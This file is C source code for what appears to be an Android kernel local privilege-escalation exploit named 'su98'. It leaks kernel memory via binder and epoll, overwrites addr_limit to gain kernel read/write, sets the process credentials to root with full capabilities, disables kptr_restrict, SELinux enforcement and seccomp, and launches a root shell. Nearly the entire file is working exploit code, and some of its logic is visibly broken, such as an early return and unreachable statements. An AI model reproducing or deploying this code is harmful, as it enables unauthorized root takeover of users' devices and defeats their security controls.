unsigned long findSymbol_in_cache(char* symbol) {
    char* pathname = allocateSymbolCachePathName(symbol);
    unsigned long address = 0;

    FILE *cached = fopen(pathname, "r");
    if (cached != NULL) {
        fscanf(cached, "%lx", &address);
        fclose(cached);
    }

    free(pathname);

    return address;
}

void cacheSymbol(char* symbol, unsigned long address) {
#ifdef KALLSYMS_CACHING
    if (address != 0 && address != findSymbol_in_cache(symbol)) {
        char* pathname = allocateSymbolCachePathName(symbol);
        FILE *cached = fopen(pathname, "w");
        if (cached != NULL) {
            fprintf(cached, "%lx\n", address);
            fclose(cached);
            char* cmd = alloca(10+strlen(pathname)+1);
            sprintf(cmd, "chmod 666 %s", pathname);
            system(cmd);
            doLog(1, 1, "Successfully cached %s!", pathname);
        }
        free(pathname);
    }
#endif
}

unsigned long findSymbol(unsigned long pointInKernelMemory, char *symbol)
{
    unsigned long address = 0;

#ifdef KALLSYMS_CACHING
    address = findSymbol_in_cache(symbol);
    if (address != 0)
        return address;
#endif

#ifndef PROC_KALLSYMS
    address = findSymbol_memory_search(symbol);
#else
    char buf[1024];
    buf[0] = 0;
    errno = 0;

    FILE *ks = fopen("/proc/kallsyms", "r");
    if (ks == NULL) {
        return findSymbol_memory_search(symbol);
    }
    fgets(buf, 1024, ks);
    if (ks != NULL)
        fclose(ks);

    if ((buf[0] == 0 || strncmp(buf, "0000000000000000", 16) == 0) && fixKallsymsFormatStrings(pointInKernelMemory) == 0) {
        address = findSymbol_memory_search(symbol);
    }
    else {
        ks = fopen("/proc/kallsyms", "r");
        while (NULL != fgets(buf, sizeof(buf), ks))
        {
            unsigned long a;
            unsigned char type;
            unsigned n = strlen(symbol);
            char sym[1024];
            sscanf(buf, "%lx %c %s", &a, &type, sym);
            if (!strncmp(sym, symbol, n) && (sym[n]=='.' || !sym[n])) {
                doLog(1, 1, "Found %s in /proc/kallsyms at %lx!", sym, a);
                address = a;
                break;
            }
        }

        fclose(ks);
    }
#endif

    return address;
}
void kptrLeak(unsigned long task_struct_ptr) {
    for (int i=0; i<PAGE-16; i+=8) {
        if (kernel_read_ulong(task_struct_ptr+i-8)>0xffffff0000000000) {
            doLog(1, 1, "Searching for kallsyms at 0x%lx", kernel_read_ulong(task_struct_ptr+i-8));
            unsigned long bk_search_base=search_base;
            search_base=kernel_read_ulong(task_struct_ptr+i-8);
            search_base = (search_base) & ~0xFFFFFul;
            doLog(1, 1, "search_base (AND) 0x%lx",search_base);
            loadKallsyms();
            if(have_base==0){search_base=bk_search_base;}
            if(good_base==1){return;}
            if(skip1!=0&&skip2!=0){search_base=skip_base;return;}
            have_base=0;
        }
    }
    doLog(1, 1, "kptrLeak finished!");
    return;
}

void checkKernelVersion() {
    kernel3 = 1;
    FILE *k = fopen("/proc/version", "r");
    if (k != NULL) {
        char buf[1024]="";
        fgets(buf, sizeof(buf), k);
        if (NULL != strstr(buf, "Linux version 4"))
            kernel3 = 0;
    }
    if (kernel3) doLog(1, 1, "Detected kernel version 3!");
    else doLog(1, 1, "Detected kernel version other than 3!");
}

// For devices with randomized thread_info located on stack
// Special thanks to chompie1337 for this code.
unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
    unsigned long kstack_data[16384/8];

    doLog(1, 1, "Searching for thread_info in kernel stack (0x%lx)...", kstack);
    if (!leak_data_retry(NULL, 0, kstack, kstack_data, sizeof(kstack_data), NULL, NULL))
        doLog(1, 1, "Failed to leak kernel stack!");

    for (unsigned int pos = 0; pos < sizeof(kstack_data)/8; pos++)
        if (kstack_data[pos] == USER_DS)
            return kstack+pos*8-8;

    return 0;
}

unsigned long find_selinux_enforcing(unsigned long search_base) {
    unsigned long address = findSymbol(search_base, "selinux_enforcing");
    if (address == 0) {
        doLog(1, 2, "Direct search didn't work, so searching via avc_denied!");
        address = findSymbol(search_base, "avc_denied");
        if (address == 0)
            doLog(1, 3, "That didn't work either, so we're screwed :(!");
            return 0;
        address = findSelinuxEnforcingFromAvcDenied(address);
    }
    return address;
}

unsigned long getCommOffset(unsigned long task_struct_ptr, char comm[16]) {
    for (unsigned long ptr = task_struct_ptr; ptr < task_struct_ptr + 0xFFF; ptr = ptr + 4) {
        char kcomm[16];
        kernel_read(ptr, kcomm, 16*8);
        kcomm[15] = '\0';
        doLog(1, 1, "kcomm = %s", kcomm);
        // Only compare the first 8 chars, because its easier.
        if (!strncmp(kcomm, comm, 15)) return ptr;
    }
    doLog(1, 3, "Couldn't find comm offset!");
    return -1;
}

void getSelfComm(char *out) {
    FILE *fp = fopen("/proc/self/comm", "r");
    if (fp == NULL) error("self/comm open failed");
    size_t read = fread(out, sizeof(char), 16, fp);
    if (!read) doLog(1, 3, "Failed to read self/comm!");
    out[read] = '\0'; // We have a \n instead
}

unsigned long get_kfiles(unsigned long task_struct_ptr, char comm[16]) {
    unsigned long base_ptr = getCommOffset(task_struct_ptr, comm);
    unsigned long files_ptr = 0;
    int tmp;
    doLog(1, 1, "base_ptr = 0x%lx", base_ptr);
    doLog(1, 1, "Looking for kfiles offset...");
    for (unsigned long tmp_ptr = base_ptr + 8; tmp_ptr < base_ptr + 0xFF; tmp_ptr = tmp_ptr + 8)
        // If we successfully read an int, we found a pointer and probably the fs_struct.
        if (raw_kernel_read(tmp_ptr, &tmp, sizeof(tmp))) {
            break;
            files_ptr = tmp_ptr + 8;
        }
    if (!files_ptr)
        doLog(1, 3, "Failed to find kfiles offset!");
    doLog(1, 1, "kfiles offset = 0x%lx", files_ptr);
    unsigned long fdtab = kernel_read_ulong(files_ptr + 8);
    if (!fdtab)
        doLog(1, 3, "Failed to find fdtab!");
    doLog(1, 1, "fdtab = 0x%lx", fdtab);
    unsigned long fd_arr = kernel_read_ulong(fdtab + 8);
    if (!fd_arr)
        doLog(1, 3, "Failed to find fd_arr!");
    doLog(1, 1, "fd_arr = 0x%lx", fd_arr);
    return fd_arr;
}

#define KFILE_SIZE 0x140

struct kmalloc_hack_result {
    unsigned long kmem_start; // inclusive
    unsigned long kmem_end;   // exclusive
    int fd_start;             // inclusive
    int fd_end;               // inclusive
};

struct kmalloc_hack_result kmalloc(int size, unsigned long task_struct_ptr) {
    int files = MAX((size + KFILE_SIZE - 1) / KFILE_SIZE, 3); // 3 is the minimum to reliably find the size of a file.

    if (files >= 64)
        doLog(1, 3, "Too many files to allocate!");
    if (!files)
        doLog(1, 3, "No files to allocate!");

    char comm[16];
    getSelfComm(comm);
    int fds[64] = {0}; // We can allocate a maximum of (64 * KFILE_SIZE), which is pretty big.
    bool worked = false;
    int first_fd, fd;
    int i;
    unsigned long last_kfile_ptr, first_kfile_ptr, next_kfile_ptr = 0;
    unsigned long kfile_ptr_diff, kfile_ptr_last_diff = 0;
    unsigned long fd_arr = get_kfiles(task_struct_ptr, comm);
    while (!worked) {
        doLog(1, 1, "Attempting to kmalloc %d files...", files);
        for (int i = 0; i < files; i++) {
            fds[i] = open("/dev/binder", O_RDONLY);
        }
        doLog(1, 1, "Opened file descriptors!");
        first_fd = fds[0];
        first_kfile_ptr = kernel_read_ulong(fd_arr + 8 * first_fd);
        worked = true;
        for (i = 0; i < files; i++) {
            fd = fds[i];
            if (!fd)
                doLog(1, 3, "Failed (%d) to open a file (%d) for kmalloc workaround", i, fd);
            next_kfile_ptr = kernel_read_ulong(fd_arr + 8 * fd);
            if (!next_kfile_ptr) error("Failed to read kfile ptr");
            kfile_ptr_last_diff = kfile_ptr_diff;
            if (last_kfile_ptr) kfile_ptr_diff = next_kfile_ptr - last_kfile_ptr;
            if (kfile_ptr_last_diff && kfile_ptr_last_diff != kfile_ptr_diff) {
                worked = false;
                doLog(1, 1, "Failed to allocate contiguous memory with kmalloc hack! (diff: %lu; last_diff: %lu; last_ptr: %lu)", kfile_ptr_diff, kfile_ptr_last_diff, last_kfile_ptr);
                break; // Failed to allocate contiguous data, retry
            }
            doLog(1, 1, "kfile_ptr_diff: %lu; last_ptr: %lu", kfile_ptr_diff, last_kfile_ptr);
            last_kfile_ptr = next_kfile_ptr;
        }
        if (worked)
            doLog(1, 1, "Allocated %lu bytes of contiguous memory with kmalloc hack!", files * KFILE_SIZE);
        else {
            for (i = 0; i < files; i++) close(fds[i]);
            doLog(1, 1, "Failed to alloc %lu bytes (target: %d) of contiguous memory with kmalloc hack", files * KFILE_SIZE, size);
        }
    }
    doLog(1, 1, "kmalloc done!");
    struct kmalloc_hack_result ret;
    ret.kmem_start = first_kfile_ptr;
    ret.kmem_end = last_kfile_ptr + kfile_ptr_diff;
    ret.fd_start = first_fd;
    ret.fd_end = fds[files-1];
    doLog(1, 1, "alloc res %lu-%lu, %d-%d", ret.kmem_start, ret.kmem_end, ret.fd_start, ret.fd_end);
    return ret;
}

int main(int argc, char **argv)
{
    int cons=0;
    int command = 0;
    int dump = 0;
    int rejoinNS = 1;

    char result[PATH_MAX];
    readlink("/proc/self/exe", result, PATH_MAX);
    char* p = strrchr(result, '/');
    if (p == NULL)
        p = result;
    else
        p++;
    *p = 0;
    myPath = result;

    p = strrchr(argv[0], '/');
    if (p == NULL)
        p = argv[0];
    else
        p++;

    myName = p;

    if (!strcmp(myName,"su")) {
        quiet = 1;
    }
    while(argc >= 2 && argv[1][0] == '-') {
        switch(argv[1][1]) {
            case 'x':
                cons = 1;
                break;
            case 'q':
                quiet = 1;
                break;
            case 'v':
                puts("su98 version 0.01");
                exit(0);
                break;
            case 'c':
                command = 1;
                quiet = 1;
                break;
            case 'd':
                dump = 1;
                break;
            case 'N':
                rejoinNS = 0;
                break;
            default:
                break;
        }
        for (int i=1; i<argc-1; i++)
            argv[i] = argv[i+1];
        argc--;
    }

    if (!dump && argc >= 2)
        quiet = 1;

    checkKernelVersion();

    doLog(1, 1, "su98 starting up");

    if (pipe(kernel_rw_pipe))
        doLog(3, 1, "kernel_rw_pipe");

    binder_fd = open("/dev/binder", O_RDONLY);

    // Make sure we can access binder (shouldn't be an issue).
    if (binder_fd < 0)
        doLog(3, 1, "binder_fd");

    epfd = epoll_create(1000);

    // Make sure we can access epoll (shouldn't be an issue).
    if (epfd < 0)
        doLog(3, 1, "epfd");

    unsigned long task_struct_plus_8 = 0xDEADBEEFDEADBEEFul;
    unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;

    if (!leak_data_retry(NULL, 0, 0, NULL, 0, &task_struct_ptr, &task_struct_plus_8)) {
        doLog(1, 3, "Failed to leak data");
    }

    unsigned long thread_info_ptr;

    if (task_struct_plus_8 == USER_DS) {
        doLog(1, 1, "thread_info is in task_struct");
        thread_info_ptr = task_struct_ptr;
    }
    else {
        doLog(1, 1, "thread_info should be in stack");
        thread_info_ptr = find_thread_info_ptr_kernel3(task_struct_plus_8);
        if (thread_info_ptr  == 0)
            doLog(1, 3, "cannot find thread_info on kernel stack!");
    }

    doLog(1, 1, "task_struct_ptr = %lx", task_struct_ptr);
    doLog(1, 1, "thread_info_ptr = %lx", thread_info_ptr);

    doLog(1, 1, "Clobbering addr_limit");
    unsigned long const src = 0xFFFFFFFFFFFFFFFEul;
    if (!clobber_data_retry(thread_info_ptr + 8, &src, 8)) {
        doLog(1, 3, "Failed to clobber data");
    }

    doLog(1, 1, "Clobbering thread_info = 0x%lx", thread_info_ptr);
    setbuf(stdout, NULL);
    doLog(1, 1, "Should have stable kernel R/W now!");

    doLog(1, 1, "Searching for cred offset in task_struct");
    unsigned char task_struct_data[PAGE+16];
    kernel_read(task_struct_ptr, task_struct_data, PAGE);

    unsigned long offset_task_struct__cred = getCredOffset(task_struct_data);
    doLog(1, 1, "leaking kernel pointer (may take a while)");
    quiet = 1;
    kptrLeak(task_struct_ptr);
    kptrInit = 1;
    kptrLeak(task_struct_ptr);
    quiet = 0;
    unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);
    unsigned long real_cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred - 8);

    doLog(1, 1, "Using last successful search_base = %lx", search_base);

    doLog(1, 1, "Searching for kptr_restrict...");
    unsigned long kptr_res = findSymbol(search_base, "kptr_restrict");
    doLog(1, 1, "Found kptr_restrict at %lu!", kptr_res);

    doLog(1, 1, "Disabling kptr_restrict...");
    kernel_write_uint(kptr_res, 0);

    doLog(1, 1, "Searching for policydb...");
    unsigned long policydb_ptr = findSymbol(search_base, "policydb");
    doLog(1, 1, "Found policydb at %lu!", policydb_ptr);

    doLog(1, 1, "Searching for selinux_enforcing...");
    unsigned long selinux_enforcing = find_selinux_enforcing(search_base);
    doLog(1, 1, "Found selinux_enforcing at %lu!", selinux_enforcing);

    unsigned int oldUID = getuid();
    unsigned int newUid = 0;

    doLog(1, 1, "setting root credentials with cred offset %lx", offset_task_struct__cred);
    for (int i = 0; i < 8; i++) {
        kernel_write_uint(cred_ptr + OFFSET__cred__uid + i * 4, newUid);
        kernel_write_uint(real_cred_ptr + OFFSET__cred__uid + i * 4, newUid);
    }

    if (getuid() != newUid)
        doLog(1, 1, "Unable to set UID to %i", newUid);

    doLog(1, 1, "UID = %i", newUid);

    // Reset 'securebits'
    doLog(1, 1, "Resetting securebits (0x%lx)", cred_ptr + OFFSET__cred__securebits);
    kernel_write_uint(cred_ptr + OFFSET__cred__securebits, 0);
    kernel_write_ulong(cred_ptr+OFFSET__cred__cap_inheritable, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_permitted, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_effective, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_bset, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);

    struct kmalloc_hack_result allocd = kmalloc(100, task_struct_ptr);
    struct kmalloc_hack_result allocd2 = kmalloc(1000, task_struct_ptr);

    execlp("sh", "sh", (char*)0);
    int seccompStatus = prctl(PR_GET_SECCOMP);
    doLog(1, 1, "SECCOMP status %d", seccompStatus);

    if (seccompStatus)
    {
        doLog(1, 1, "Disabling SECCOMP...");
        kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
        int offset__task_struct__seccomp = getSeccompOffset(task_struct_data, offset_task_struct__cred, seccompStatus);
        if (offset__task_struct__seccomp < 0)
            doLog(1, 3, "Failed to find seccomp offset");
        else {
            doLog(1, 1, "SECCOMP offset = %ld", offset__task_struct__seccomp);
            kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp, 0);
            kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp + 8, 0);
            doLog(1, 1, "SECCOMP status %d", prctl(PR_GET_SECCOMP));
        }
    }

    unsigned prev_selinux_enforcing = 1;

    if (selinux_enforcing == 0)
        doLog(1, 1, "Unable to find selinux_enforcing symbol!");
    else
    {
        prev_selinux_enforcing = kernel_read_uint(selinux_enforcing);
        kernel_write_uint(selinux_enforcing, 0);
        doLog(1, 1, "Disabled selinux enforcing");
        cacheSymbol("selinux_enforcing", selinux_enforcing);
    }

    if (rejoinNS) {
        char cwd[1024];
        getcwd(cwd, sizeof(cwd));

        doLog(1, 1, "rejoining init fs namespace...");
        int fd = open("/proc/1/ns/mnt", O_RDONLY);

        if (fd < 0) {
            doLog(1, 3, "Unable to open /proc/1/ns/mnt!");
            exit(1);
        }

        if (setns(fd, CLONE_NEWNS) < 0) {
            doLog(1, 3, "Unable to rejoin init fs namespace!");
        }

        doLog(1, 1, "rejoining init net namespace...");
        fd = open("/proc/1/ns/net", O_RDONLY);

        if (fd < 0) {
            doLog(1, 3, "Unable to open /proc/1/ns/net!");
        }

        if (setns(fd, CLONE_NEWNET) < 0) {
            doLog(1, 3, "Unable to rejoin init net namespace!");
        }

        chdir(cwd);
    }

    doLog(1, 1, "root privilegies are ready!");

    if (command || argc == 2) {
        execlp("sh", "sh", "-c", argv[1], (char *)0);
    }
    else {
        doLog(1, 1, "Starting shell...");
        execlp("sh", "sh", (char*)0);
    }

    exit(0);
}
